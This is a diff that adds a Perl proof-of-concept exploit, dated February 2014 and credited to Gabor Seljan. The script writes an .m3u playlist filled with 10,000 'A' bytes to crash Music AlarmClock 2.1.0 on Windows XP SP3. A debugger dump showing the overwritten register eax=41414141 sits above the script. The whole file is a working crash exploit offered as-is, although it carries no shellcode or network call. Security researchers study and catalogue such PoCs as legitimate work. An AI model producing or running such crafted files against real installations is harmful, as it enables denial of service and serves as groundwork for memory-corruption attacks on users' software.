@@ -1,0 +1,30 @@
+#------------------------------------------------------------------------------------#
+# Exploit Title: Music AlarmClock 2.1.0 (.m3u) Crash PoC                             #
+# Date: Feb 25 2014                                                                  #
+# Exploit Author: Gabor Seljan                                                       #
+# Software Link: http://download.cnet.com/Music-AlarmClock/3000-2350_4-10419263.html #
+# Version: 2.1.0                                                                     #
+# Tested on: Windows XP SP3                                                          #
+#------------------------------------------------------------------------------------#
+
+# (a10.9e8): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=41414141 ebx=00000000 ecx=7ffdd000 edx=41414161 esi=00153700 edi=0012df10
+# eip=7c90100b esp=0012d5c8 ebp=0012d5d0 iopl=0         nv up ei pl nz na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+
+my $filename = "poc.m3u";
+
+my $junk = "A" x 10000;
+
+open(FILE, ">$filename") || die "[-]Error:\n$!\n";
+print FILE $junk;
+close(FILE);
+
+print "Exploit file created successfully [$filename]!\n";
